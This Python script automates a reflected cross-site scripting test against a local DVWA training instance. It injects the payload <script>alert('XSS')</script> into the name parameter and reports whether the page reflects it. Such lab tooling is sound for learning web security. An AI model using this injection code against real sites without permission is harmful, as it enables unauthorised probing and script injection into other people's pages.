import requests
from bs4 import BeautifulSoup as bs
from Helpers import helper_dvwa
from Helpers import helper_generic_tags


BASE_URL = "http://127.0.0.1:80/DVWA"
SCRIPT = "<script>alert('XSS')</script>"
INJECT_DATA = {"name": SCRIPT, "submit": "Submit"}
COOKIES_JSON = {
    "PHPSESSID": helper_dvwa.get_user_token(f"{BASE_URL}/login.php"),
    "security": "low"
}


def main():
    
    # Pass the login page: "http://127.0.0.1:80/DVWA/index.php"
    session = requests.Session()
    index_page_response = session.get(f"{BASE_URL}/index.php", cookies = COOKIES_JSON)

    # Entering to xss reflected page : "http://127.0.0.1:80/DVWA/vulnerabilities/xss_r"
    xss_r_page = session.get(f"{BASE_URL}/vulnerabilities/xss_r/", cookies=COOKIES_JSON)

    # To see the structure of the data we need to send:
    ls_forms = helper_generic_tags.GetGenericTags.get_tags(xss_r_page.text, "form", {})

    # Inserting the data and in put the script in the name filed:
    res = requests.get(f"{BASE_URL}/vulnerabilities/xss_r/", params = INJECT_DATA, cookies = COOKIES_JSON )
    
    # Check i the script saved in the website:
    if SCRIPT in res.text:
        print("Your website is vulnerable to XSS Injection attack!")
    else:
        print("Your website is NOT vulnerable to XSS Injection attack.")


if __name__ == "__main__":
    main()
